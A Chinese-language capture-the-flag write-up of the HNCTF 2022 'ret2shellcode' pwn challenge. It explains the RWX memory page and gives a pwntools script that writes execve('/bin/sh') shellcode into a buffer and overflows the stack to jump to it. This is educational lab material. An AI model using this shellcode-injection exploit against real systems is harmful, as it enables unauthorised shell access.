# [HNCTF 2022 Week1]ret2shellcode_WP

**NX 防护下的 ret2shellcode**

> **平台**：NSSCTF  
> **方向**：Pwn  
> **知识点**：NX、ret2shellcode  
> **难度**：中等

## 一、信息获取

![image01](/pwn/[HNCTF%202022%20Week1]ret2shellcode_WP/image/image01.png)

checksec：存在NX，无PIE，64位

## 二、分析

![image02](/pwn/[HNCTF%202022%20Week1]ret2shellcode_WP/image/image02.png)

分析源码逻辑可知，其将stdout所在的内存页权限改为7（可读、可写、可执行）

![image03](/pwn/[HNCTF%202022%20Week1]ret2shellcode_WP/image/image03.png)

通过pwndbg可以发现buff和stdout其实是在同一页的，因此要利用源码里的strcpy将shellcode写入buff，并通过栈溢出把main的返回地址覆盖为buff的地址

## 三、EXP

```python
from pwn import *
#p = process("./shellcode")
p = remote(...)
context.log_level = "debug"
context.arch = "amd64"

shellcode = asm(shellcraft.amd64.sh())
#调用 execve("/bin/sh") 的 amd64 shellcode
shellcode = shellcode.ljust(256,b'A')

payload = shellcode + b'A'*8 + p64(0x00000000004040A0)

p.send(payload)
p.interactive()
```

## 四、总结

`strcpy(buff, buf)`也可以推测一下，buff所在页是有执行权限的，最后再反过来验证
思路仅供参考，如有疑问或发现疏漏，欢迎各位师傅在评论区指正交流。
